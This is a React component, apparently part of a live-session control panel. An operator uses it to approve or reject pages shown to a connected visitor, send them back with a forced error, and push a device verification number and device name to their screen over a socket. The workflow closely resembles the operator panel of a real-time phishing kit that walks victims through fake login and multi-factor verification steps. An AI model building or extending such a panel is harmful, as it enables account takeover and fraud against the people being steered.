import { CheckCircleIcon, MinusCircleIcon } from "@heroicons/react/20/solid"
import { Modal, Popover } from "@nextui-org/react"
import { memo, useContext } from "react"
import { SocketContext } from "../../context/SocketContext"
import { useFormik } from "formik"

const valuesData = {numberDevice: '', typeDevice: '', pageNow: '', urlPage: '' }

export const ModalLive = memo(({modalData, setVisible, visible}) => {
    
    const { isConnected, socketID, pageNow, liveData } = modalData
    
    const {socket} = useContext(SocketContext)
    
    const closeHandler = () => { setVisible(false) }

    const sendUrl = ({urlPage, viewError = false}) => {
        const user = {socketID, viewError, isLoading: false, url: urlPage}
        socket.emit('[LIVE] changeUrlPanel', {user})
        setVisible(false)
    }

    const { values, handleSubmit, handleChange, handleBlur } = useFormik({
        initialValues: valuesData,
        onSubmit: async(valuesData, {resetForm}) => {
            const { viewError, pageNow, urlPage, numberDevice, typeDevice } = valuesData
            const user = {isLoading: false, socketID, url: urlPage, numberDevice, typeDevice, viewError, pageNow}
            await socket.emit('[LIVE] changeUrlPanel', {user})
            resetForm()
            setVisible(false)
        }
    })

    
    return (
        <Modal
            closeButton
            aria-labelledby="modal-title"
            open={visible}
            onClose={closeHandler}
        >
            <Modal.Header>
                <p className="font-bold"> {isConnected === true ? <div className="bg-green-600 inline-block mr-2 h-[10px] w-[10px] rounded-full"></div> : <div className="bg-red-600 inline-block mr-2 h-[10px] w-[10px] rounded-full"></div>}Sesión: {socketID}</p>
            </Modal.Header>
            <Modal.Body>
                {
                    liveData?.map( ({textPage, urlPage}) => (
                        <div key={urlPage} className={pageNow === urlPage ? "flex justify-between border-[1px] rounded p-2 bg-[#0073ffe3] text-white" : "flex justify-between border-[1px] rounded p-2"}>
                            <p>{textPage}</p>
                            <div className="flex gap-2">
                                <Popover placement="left">
                                    <Popover.Trigger>
                                        <CheckCircleIcon fill="#198754" height={24} />
                                    </Popover.Trigger>
                                    <Popover.Content className="p-2 text-center">
                                        <span>
                                            Estas seguro de que quieres aprobar <br /> <span className="font-bold">{textPage}</span>?
                                        </span>
                                        <br />
                                            {
                                                urlPage === '/verificationDevice' ? (
                                                    <form onSubmit={handleSubmit}>    
                                                        <div className="flex flex-col gap-2 mt-5">
                                                            <div className="hidden">
                                                                {values.pageNow = pageNow}
                                                                {values.urlPage = urlPage}
                                                            </div>
                                                            <div>    
                                                                <p className="text-left text-[14px]">numero verificacion</p>
                                                                <input 
                                                                    className='p-[6px] border-[1px] w-full rounded-[5px] border-[#97a3ae] outline-none'
                                                                    name="numberDevice"
                                                                    placeholder="numero del dispositivo"
                                                                    onBlur={handleBlur}
                                                                    onChange={handleChange}
                                                                    type='number'
                                                                    value={values.numberDevice}
                                                                />
                                                            </div>
                                                            <div>
                                                                <p className="text-left text-[14px]">Nombre del dispositivo</p>
                                                                <input 
                                                                    className='p-[6px] border-[1px] w-full rounded-[5px] border-[#97a3ae] outline-none'
                                                                    name="typeDevice"
                                                                    placeholder="Nombre del dispositivo"
                                                                    onBlur={handleBlur}
                                                                    onChange={handleChange}
                                                                    type='text'
                                                                    value={values.typeDevice}
                                                                />
                                                            </div>
                                                            <button type="submit" className="py-2 px-5 bg-green-600 mt-3 rounded w-full text-white">Aprobar</button>
                                                        </div>
                                                    </form>
                                                ) : (<button onClick={() => sendUrl({urlPage})} className="py-2 px-5 bg-green-600 mt-3 rounded w-full text-white">Aprobar</button>)
                                            }
                                    </Popover.Content>
                                </Popover>
                                <Popover placement="left">
                                    <Popover.Trigger>
                                        <MinusCircleIcon fill="#DC2626" height={24}/>  
                                    </Popover.Trigger>
                                    <Popover.Content className="p-2 text-center">
                                        <span>
                                            Estas seguro de que quieres cancelar <br /> <span className="font-bold">{textPage}</span>?
                                        </span>
                                        <br />
                                        <button onClick={() => sendUrl({urlPage, viewError: true})} className="py-2 px-5 bg-red-600 mt-3 rounded w-full text-white">Mandar error</button>
                                    </Popover.Content>
                                </Popover>
                            </div>
                        </div>
                    ) )
                }
                <span className="bg-yellow-300 p-2 rounded-sm mt-20">NOTA: Siempre que coloques INCORRECTO, mandara de nuevo a la página y un error</span>
            </Modal.Body>
            <Modal.Footer>
                <button className="bg-red-600 p-2 w-full rounded text-[16px] text-white">Cerrar</button>
            </Modal.Footer>
        </Modal>
    )
})